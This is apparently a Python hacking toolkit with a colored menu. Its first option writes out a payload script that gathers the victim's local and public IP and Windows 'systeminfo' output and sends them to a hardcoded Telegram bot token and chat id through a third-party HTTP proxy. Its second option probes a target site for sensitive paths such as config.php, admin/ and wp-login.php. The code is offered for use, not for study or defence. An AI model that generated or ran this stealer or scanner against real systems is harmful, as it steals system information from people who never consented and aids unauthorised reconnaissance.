#librery 
from colorama import Fore,init
import os
import time
import socket
import requests
import platform
init()

# Start cood


while True: 
  try:
   
# unscrew text
   # with open("settings/send.txt","r") as a :
   #   send =  a.read()

   # with open("settings/baner.txt","r") as b:
   #  baner =   b.read()

   print(Fore.LIGHTCYAN_EX+"""
   
                         _'
                        -0+'
                       '000/
                      '+0000;
                     '+D000000;       _________  _______    _      _________
                    -+0DD000DD;       \__   __/ (  ____ \  ( \     \__   __/
                   '/:_:++000000+:       ) (    | (    \/  | (        ) (
                  '/+++/++++++++++;      | |    | (__      | |        | |
                 '/++++++++++++++++;     | |    |  __)     | |        | |
                '/+++00000000000000/'    | |    | (        | |        | |
               'D000SSS0++033388380+'    | |    | (____/\  | (____/\  | |
             -00SSSS0_''''''/DSSSSSS+,   )_(    (_______/  (_______/  )_(
            _0SSSS0S+        :SSSSSSSS0,
            :0SSSSSS/         0SSSSSSS+-
           /0SSSSSSS/         +SSSSS000/-
        '/DSSSSSD+/:            -:/+DSSSS0+-
        '/SS0+:-'                 '-/+0S0:
        '++:,                        '-/+/
    .,:++-,:                            0+-00":
    .*0"'0SS                              D000S0D
    000S+-                                =+-SSFG 
   """)
   


   hust_name = socket.gethostname()
   lokal_ip =socket.gethostbyname(hust_name)

  
   https = requests.get("https://api.ipify.org/").text
   name_System = platform.uname()[0]
   name_Node = platform.uname()[2]

# spaced 
   print("\n")
   print(Fore.LIGHTYELLOW_EX+"Os System >>> "+Fore.LIGHTBLACK_EX+name_System)
   print("\n")
   print(Fore.LIGHTYELLOW_EX+"Os Release >>> "+Fore.LIGHTBLACK_EX+name_Node)
   
   
   print("\n")
   print(Fore.LIGHTYELLOW_EX+"Your IP Publik >>> "+Fore.LIGHTBLACK_EX+https)
   
# spaced 

   print("\n")

   print(Fore.LIGHTYELLOW_EX+"Your Local IP >>> "+Fore.LIGHTBLACK_EX+lokal_ip)
# options
# spaced 

   print("\n")

   options_First = print(Fore.LIGHTYELLOW_EX+"[1]"+Fore.LIGHTWHITE_EX+"Making The File Submitted Reference Managed To Bhatt Telegrams"+"\n")
   options_Second = print(Fore.LIGHTYELLOW_EX+"[2]"+Fore.LIGHTWHITE_EX+"Website Folder Scanner"+"\n")
   options_secondary = print(Fore.LIGHTYELLOW_EX+"[3]"+Fore.LIGHTWHITE_EX+"Overseas Latest"+"\n")
 
# input
   
   input_one = input("Enter One Options >>>")
   
#  bets dachas
   
   if input_one == "1":
# spaced 
     print("\n")
    
     input_two = input("Enter Name File >>>")



     with  open("the file featuring made out/"+input_two+".py","w") as f :
       f.write("""
import requests
import subprocess
import socket
from colorama import Fore,init

init()

hust_name = socket.gethostname()
lokal_ip =socket.gethostbyname(hust_name)

lokal = ("Your Local IP >>>"+Fore.LIGHTRED_EX+lokal_ip)
https = requests.get("https://api.ipify.org/").text


http =("Your IP Publik >>>"+Fore.LIGHTRED_EX+https)

hme = lokal+http

informtion= subprocess.getoutput("systeminfo")

a = (informtion[0:1550])
       


url = "https://api.telegram.org/bot6050686473:AAGzqewVzMHZVQ_1y5nIiLxfhzZLaiSOfBE/sendmessage?chat_id=1468157269&text="+str(a+hme)

info = { "UrlBox":url,
      "AgentList":"Mozilla Firefox",
      "VersionsList":" HTTP/1.1",
      "MethodList":"GET"
}

http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=info)
""") 


     print("\n")
     print(Fore.GREEN+"\t"+"LOGING... ")
     time.sleep(5)
     os.system("cls")


   if input_one == "3":
    exit()  

   else:
      pass
     
   search = ['robots.txt',
'search/',
'admin/',
'login/',
'sitemap.xml',
'sitemap2.xml',
'config.php',
'wp-login.php',
'log.txt',
'update.php',
'INSTALL.pgsql.txt',
'user/login/',
'INSTALL.txt',
'profiles/',
'scripts/',
'LICENSE.txt',
'CHANGELOG.txt',
'themes/',
'inculdes/',
'misc/',
'user/logout/',
'user/register/',
'cron.php',
'filter/tips/',
'comment/reply/',
'xmlrpc.php',
'modules/',
'install.php',
'MAINTAINERS.txt',
'user/password/',
'node/add/',
'INSTALL.sqlite.txt',
'UPGRADE.txt',
'INSTALL.mysql.txt']  

   if input_one == "2":
# spaced

      def __start__():

       print("[!] Plase Enter Websit Adress \n")

       url = input("Enter URL :")
    
       if 'http' in url:      

         pass
 
       elif 'http' not in url:
   
         url = ('http://'+url)

       for i in search:
         ur = (url+"/"+i)
         repr = requests.get(ur)
         if repr.status_code == 200 or repr.status_code == 405:
            
              print(Fore.LIGHTGREEN_EX+"[+]"+Fore.LIGHTWHITE_EX+ ur)

         else:
              print(Fore.LIGHTRED_EX+"[-]"+Fore.LIGHTWHITE_EX+ ur)
       
       input("[!]"+"Back To Menu (Press Enter...)")
       
       os.system("cls")
      __start__()
 
   
      
   
      
   
   
   
# will manage error dachas

  except KeyboardInterrupt:
   #  print(Fore.LIGHTGREEN_EX+"\n"+"\n"+"Good"+"\n")
    

  
    os.system("cls")
    

  except OSError:
   print(Fore.LIGHTRED_EX+"\n"+"Please Correct Typed Or No Internet !"+"\n")
   time.sleep((5))
   os.system("cls")